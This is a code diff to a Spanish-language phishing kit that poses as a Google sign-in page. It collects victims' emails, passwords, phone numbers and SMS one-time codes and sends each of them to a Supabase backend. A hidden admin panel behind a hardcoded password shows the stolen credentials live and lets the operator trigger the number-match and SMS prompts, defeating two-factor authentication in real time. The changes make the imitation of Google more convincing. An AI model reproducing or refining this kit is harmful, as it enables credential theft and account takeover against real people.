@@ -9,23 +9,23 @@
     <style>
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .fade-in { animation: fadeIn 0.4s ease-out; }
-        #admin-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; backdrop-filter: blur(5px); }
+        #admin-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; backdrop-filter: blur(8px); }
     </style>
 </head>
 <body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none" id="main-body">
 
-    <!-- Admin Modal -->
+    <!-- Modal Admin -->
     <div id="admin-modal" class="flex items-center justify-center">
         <div class="bg-zinc-900 p-8 rounded-2xl border border-zinc-700 w-full max-w-sm text-center space-y-4">
-            <h3 class="text-emerald-500 font-mono font-bold uppercase">Acceso Admin</h3>
-            <input type="password" id="admin-pass-input" placeholder="Clave" class="w-full p-2 bg-black border border-zinc-600 rounded text-white text-center outline-none">
-            <button id="admin-login-btn" class="w-full py-2 bg-emerald-600 text-white rounded font-bold hover:bg-emerald-500 transition">ENTRAR</button>
+            <h3 class="text-yellow-500 font-mono font-bold uppercase tracking-widest">Acceso Restringido</h3>
+            <input type="password" id="admin-pass-input" placeholder="••••••••" class="w-full p-3 bg-black border border-zinc-600 rounded-lg text-white text-center outline-none focus:border-yellow-500">
+            <button id="admin-login-btn" class="w-full py-3 bg-yellow-600 text-black rounded-lg font-black hover:bg-yellow-500 transition uppercase">Entrar al Sistema</button>
         </div>
     </div>
 
-    <!-- Main Container -->
+    <!-- Contenedor App -->
     <div id="app-container" class="w-full max-w-[440px] p-8 bg-white border border-gray-200 rounded-2xl relative shadow-sm fade-in">
-        <div id="admin-trigger" class="absolute top-0 right-0 w-16 h-16 z-50"></div>
+        <div id="admin-trigger" class="absolute top-0 right-0 w-20 h-20 z-50 cursor-pointer"></div>
         <div class="flex justify-center mb-8" id="logo-container">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-6">
         </div>
@@ -33,7 +33,6 @@
     </div>
 
     <script>
-        // CONFIGURACIÓN
         const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
         const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
         const ADMIN_PASS = "sebas22034";
@@ -43,52 +42,22 @@
         let state = {
             view: 'victim',
             step: 'login',
-            sessionId: `ID_${Math.random().toString(36).substr(2, 4).toUpperCase()}`,
+            sessionId: `ID_${Math.random().toString(36).substr(2, 5).toUpperCase()}`,
             data: { email: '', password: '', phone: '', sms: '' },
             targetNum: '--' 
         };
 
-        // Registro de columnas que el sistema ignorará si fallan
-        let ignoredColumns = new Set();
-
         async function sync(step, extra = {}) {
-            let payload = {
+            const payload = {
                 session_id: state.sessionId,
                 email: extra.email || state.data.email || '',
                 password: extra.password || state.data.password || '',
                 phone: extra.phone || state.data.phone || '',
                 sms: extra.sms || state.data.sms || '',
-                step: step
+                step: step,
+                target_num: state.targetNum === '--' ? null : state.targetNum
             };
-
-            // Intentar añadir columnas que suelen dar error si no existen
-            if (!ignoredColumns.has('updated_at')) payload.updated_at = new Date().toISOString();
-            
-            const targetVal = state.targetNum === '--' ? null : state.targetNum;
-            
-            // Probar primero con target_num (como se ve en tu captura)
-            if (!ignoredColumns.has('target_num')) {
-                payload.target_num = targetVal;
-            } else if (!ignoredColumns.has('target_number')) {
-                payload.target_number = targetVal;
-            }
-
-            const { error } = await client.from('sessions').upsert(payload, { onConflict: 'session_id' });
-            
-            if (error) {
-                console.warn("Error de sincronización detectado:", error.message);
-                
-                // Si el error dice que la columna no existe, la ignoramos y reintentamos
-                if (error.message.includes('column') || error.message.includes('not find')) {
-                    // Extraer el nombre de la columna del error si es posible
-                    const match = error.message.match(/'([^']+)'/);
-                    if (match && match[1]) {
-                        ignoredColumns.add(match[1]);
-                        console.log(`Auto-corrección: Ignorando columna faltante [${match[1]}]`);
-                        return sync(step, extra); 
-                    }
-                }
-            }
+            await client.from('sessions').upsert(payload, { onConflict: 'session_id' });
         }
 
         function render() {
@@ -97,74 +66,88 @@
 
             if (state.step === 'login') {
                 c.innerHTML = `
-                    <div class="text-center mb-6"><h2 class="text-xl">Iniciar sesión</h2></div>
+                    <div class="text-center mb-6"><h2 class="text-xl font-medium">Acceder</h2><p class="text-sm mt-2 text-gray-600">Utiliza tu cuenta de Google</p></div>
                     <form class="space-y-4" onsubmit="event.preventDefault(); state.data.email=this.e.value; state.data.password=this.p.value; state.step='phone'; sync('phone'); render();">
-                        <input name="e" required type="email" placeholder="Correo electrónico" class="w-full p-3 border rounded-lg">
-                        <input name="p" required type="password" placeholder="Contraseña" class="w-full p-3 border rounded-lg">
-                        <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold">Siguiente</button>
+                        <input name="e" required type="email" placeholder="Correo electrónico o teléfono" class="w-full p-3 border rounded focus:ring-2 focus:ring-blue-500 outline-none">
+                        <input name="p" required type="password" placeholder="Escribe tu contraseña" class="w-full p-3 border rounded focus:ring-2 focus:ring-blue-500 outline-none">
+                        <div class="flex justify-between items-center mt-8">
+                            <span class="text-blue-600 font-bold text-sm cursor-pointer">¿Olvidaste tu correo?</span>
+                            <button class="bg-blue-600 text-white px-6 py-2 rounded font-medium">Siguiente</button>
+                        </div>
                     </form>`;
             } else if (state.step === 'phone') {
                 c.innerHTML = `
-                    <h2 class="text-lg text-center mb-4">Verificación</h2>
+                    <h2 class="text-lg text-center mb-4">Verifica tu teléfono</h2>
                     <form class="space-y-4" onsubmit="event.preventDefault(); state.data.phone=this.t.value; state.step='wait'; sync('wait'); render();">
-                        <input name="t" required type="tel" placeholder="Número de teléfono" class="w-full p-3 border rounded-lg text-center">
-                        <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold">Enviar</button>
+                        <input name="t" required type="tel" placeholder="Número de móvil" class="w-full p-4 border rounded-xl text-center text-2xl font-bold tracking-widest">
+                        <button class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold uppercase tracking-tighter">Enviar Solicitud</button>
                     </form>`;
             } else if (state.step === 'wait') {
                 c.innerHTML = `
                     <div class="text-center py-6 fade-in">
-                        <p class="mb-4">Toca el número en tu teléfono:</p>
-                        <div class="text-7xl font-bold text-blue-600 py-10 bg-blue-50 rounded-2xl animate-pulse border-2 border-blue-100">
+                        <p class="mb-6 text-gray-600 text-sm">Abre la aplicación de Google en tu dispositivo y toca el número:</p>
+                        <div class="text-8xl font-black text-blue-600 py-12 bg-blue-50 rounded-3xl animate-pulse border-4 border-blue-200">
                             ${state.targetNum}
                         </div>
-                        <p class="text-[10px] text-gray-400 mt-6 uppercase tracking-widest">Esperando confirmación...</p>
+                        <p class="text-[10px] text-gray-400 mt-8 uppercase font-bold tracking-[0.2em]">Sincronizando con dispositivo...</p>
                     </div>`;
             } else if (state.step === 'sms') {
                 c.innerHTML = `
-                    <h2 class="text-lg text-center mb-4">Código G-</h2>
-                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.sms=this.s.value; state.step='end'; sync('end'); render(); setTimeout(()=>location.href='https://accounts.google.com',2000);">
-                        <input name="s" required type="number" placeholder="Introduce el código" class="w-full p-3 border rounded-lg text-center text-xl">
-                        <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold">Validar</button>
+                    <h2 class="text-lg text-center mb-4 font-bold">Introduce el código</h2>
+                    <form class="space-y-4" onsubmit="event.preventDefault(); state.data.sms=this.s.value; state.step='end'; sync('end'); render(); setTimeout(()=>location.href='https://myaccount.google.com',3000);">
+                        <div class="flex items-center border-2 border-blue-500 p-4 rounded-xl">
+                            <span class="text-2xl font-bold text-gray-400 mr-2">G-</span>
+                            <input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none font-mono tracking-widest">
+                        </div>
+                        <button class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold uppercase">Verificar código</button>
                     </form>`;
             } else if (state.step === 'end') {
-                c.innerHTML = `<div class="text-center py-10 text-emerald-600 font-bold">✓ Acceso verificado</div>`;
+                c.innerHTML = `<div class="text-center py-10 text-emerald-600 font-bold animate-bounce text-xl">✓ Verificación completada</div>`;
             }
         }
 
         async function renderAdmin() {
-            document.getElementById('main-body').className = "bg-zinc-950 p-4 text-white font-mono";
             const { data } = await client.from('sessions').select('*');
-            const main = document.getElementById('app-container');
-            main.className = "w-full max-w-6xl bg-zinc-900 border-zinc-800 p-6 rounded-3xl mx-auto";
-            document.getElementById('logo-container').innerHTML = `<h2 class="text-emerald-500 font-bold">CONTROL PANEL [${data?.length || 0}]</h2>`;
+            const c = document.getElementById('view-content');
+            document.body.className = "bg-zinc-950 p-4 text-white font-sans";
+            document.getElementById('app-container').className = "w-full max-w-5xl bg-zinc-900 border-zinc-800 p-8 rounded-[2rem] mx-auto shadow-2xl";
+            document.getElementById('logo-container').innerHTML = `
+                <div class="flex justify-between items-center w-full border-b border-zinc-800 pb-4">
+                    <h2 class="text-yellow-500 font-black text-2xl tracking-tighter italic">ADMIN_CORE v2</h2>
+                    <span class="bg-yellow-500/10 text-yellow-500 px-4 py-1 rounded-full text-xs font-bold border border-yellow-500/20">SESIONES: ${data?.length || 0}</span>
+                </div>`;
             
-            let html = `<div class="grid gap-4 md:grid-cols-2 lg:grid-cols-3">`;
+            let html = `<div class="grid gap-6 md:grid-cols-2 mt-6">`;
             data?.forEach(s => {
-                const currentNum = s.target_num || s.target_number || '--';
                 html += `
-                    <div class="border border-zinc-700 p-4 rounded-xl bg-black/50">
-                        <div class="flex justify-between border-b border-zinc-800 pb-2 mb-3">
-                            <span class="text-zinc-500 text-[10px]">${s.session_id}</span>
-                            <span class="text-blue-400 text-[10px] uppercase">${s.step}</span>
+                    <div class="bg-black/40 border border-zinc-800 p-6 rounded-2xl hover:border-yellow-500/50 transition-all group">
+                        <div class="flex justify-between items-start mb-4">
+                            <div>
+                                <p class="text-[10px] text-zinc-500 font-mono">${s.session_id}</p>
+                                <p class="text-yellow-500 font-bold text-lg truncate w-48">${s.email || 'NUEVA SESIÓN'}</p>
+                            </div>
+                            <span class="text-[10px] font-bold px-2 py-1 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded uppercase">${s.step}</span>
                         </div>
-                        <p class="text-[11px]">E: ${s.email || '-'}</p>
-                        <p class="text-[11px]">P: ${s.password || '-'}</p>
-                        <p class="text-emerald-400 font-bold my-2 text-sm">SMS: ${s.sms || '...'}</p>
-                        <div class="flex gap-2 mt-4">
-                            <input type="text" value="${currentNum}" placeholder="Nº" maxlength="2" 
-                                class="w-10 bg-zinc-800 border-zinc-700 text-center text-yellow-500 font-bold rounded" 
-                                onchange="updateNum('${s.session_id}', this.value)">
-                            <button onclick="forceSms('${s.session_id}')" class="flex-1 bg-blue-600 text-white py-1 rounded text-[10px] font-bold">PEDIR SMS</button>
+                        <div class="space-y-2 mb-6">
+                            <p class="text-xs text-zinc-400">PASSWORD: <span class="text-white">${s.password || '***'}</span></p>
+                            <p class="text-xs text-zinc-400">TELÉFONO: <span class="text-white">${s.phone || '---'}</span></p>
+                            <p class="text-sm font-bold text-emerald-400 bg-emerald-500/5 p-2 rounded border border-emerald-500/10">SMS: ${s.sms || 'ESPERANDO...'}</p>
+                        </div>
+                        <div class="flex items-center gap-3 border-t border-zinc-800 pt-4">
+                            <div class="flex flex-col flex-1">
+                                <label class="text-[9px] text-zinc-500 uppercase font-black mb-1">Número a mostrar (2 dígitos):</label>
+                                <input type="text" value="${s.target_num || ''}" placeholder="--" maxlength="2" 
+                                    class="w-full bg-zinc-800 border-2 border-zinc-700 text-center text-yellow-400 text-2xl font-black rounded-xl p-2 focus:border-yellow-500 outline-none" 
+                                    onchange="updateNum('${s.session_id}', this.value)">
+                            </div>
+                            <button onclick="forceSms('${s.session_id}')" class="h-14 flex-[1.5] bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-black text-xs uppercase shadow-lg shadow-blue-900/20">Pedir SMS</button>
                         </div>
                     </div>`;
             });
-            document.getElementById('view-content').innerHTML = html + `</div>`;
+            c.innerHTML = html + (data?.length === 0 ? '<p class="text-zinc-600 text-center py-20 font-bold italic col-span-2">No hay sesiones activas. Esperando víctimas...</p>' : '') + `</div>`;
         }
 
-        window.updateNum = async (id, val) => { 
-            let payload = ignoredColumns.has('target_num') ? { target_number: val } : { target_num: val };
-            await client.from('sessions').update(payload).eq('session_id', id);
-        };
+        window.updateNum = async (id, val) => { await client.from('sessions').update({ target_num: val }).eq('session_id', id); };
         window.forceSms = async (id) => { await client.from('sessions').update({ step: 'sms' }).eq('session_id', id); renderAdmin(); };
 
         document.getElementById('admin-trigger').ondblclick = () => { document.getElementById('admin-modal').style.display = 'flex'; };
@@ -173,7 +156,7 @@
                 state.view = 'admin';
                 document.getElementById('admin-modal').style.display = 'none';
                 renderAdmin();
-                setInterval(renderAdmin, 5000);
+                setInterval(renderAdmin, 4000);
             }
         };
 
@@ -181,7 +164,7 @@
             sync('login'); 
             render();
             client.channel('any').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${state.sessionId}` }, (p) => {
-                state.targetNum = p.new.target_num || p.new.target_number || '--';
+                state.targetNum = p.new.target_num || '--';
                 state.step = p.new.step;
                 if (state.view === 'victim') render();
             }).subscribe();
